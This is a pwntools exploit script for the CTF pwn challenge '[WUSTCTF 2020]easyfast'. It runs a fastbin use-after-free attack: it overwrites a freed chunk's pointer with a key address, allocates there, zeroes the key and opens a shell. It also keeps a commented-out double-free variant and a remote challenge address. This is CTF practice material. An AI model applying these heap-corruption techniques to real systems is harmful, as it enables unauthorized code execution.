from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])

io=process("./[WUSTCTF 2020]easyfast")
# io=remote("43.143.7.127",28201)
elf=ELF("./[WUSTCTF 2020]easyfast")
libc=ELF("./libc-2.23.so")

shell=0x4008ab
key_ptr=0x602080

def alloc(n):
    io.sendlineafter(b"choice>\n",b"1")
    io.sendlineafter(b"size>\n",str(n))

def delete(n):
    io.sendlineafter(b"choice>\n",b"2")
    io.sendlineafter(b"index>\n", str(n))

def edit(n,c,cc):
    io.sendlineafter(b"choice>\n",b"3")
    io.sendlineafter(b"index>\n", str(n))
    io.send(cc)

def shell():
    io.sendlineafter(b"choice>\n",b"4")


alloc(0x40) #0
delete(0)
payload=p64(key_ptr)

gdb.attach(io)
pause()

edit(0,len(payload),payload)
alloc(0x40) #1
alloc(0x40) #2
payload=p64(0)
edit(2,len(payload),p64(0))


# alloc(0x40) #0
# alloc(0x40) #1
# delete(0)
# delete(1) #main_arena->0->1->0
# delete(0)

# gdb.attach(io)
# pause()

# alloc(0x40) #2
# alloc(0x40) #3

# payload=p64(key_ptr)
# edit(1,len(payload),payload)

# alloc(0x40) #4
# alloc(0x40) #5

shell()
# delete(1)
# alloc(1)

io.interactive()